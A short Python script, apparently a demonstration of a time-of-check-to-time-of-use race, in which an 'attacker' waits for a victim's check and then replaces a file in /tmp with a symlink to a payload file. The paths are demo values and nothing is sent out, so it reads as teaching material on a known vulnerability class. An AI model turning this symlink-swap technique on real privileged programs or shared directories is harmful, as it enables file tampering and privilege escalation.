#!/usr/bin/env python3
import os
import time

original="/tmp/demo_file.txt"
payload="/tmp/evil_payload.txt"

#wait for the victim to finish checking
time.sleep(1)

#Remove the original and replace it with the payload
os.remove(original)
os.symlink(payload, original)

print("[Attacker] Swapped file with symlink to payload!")
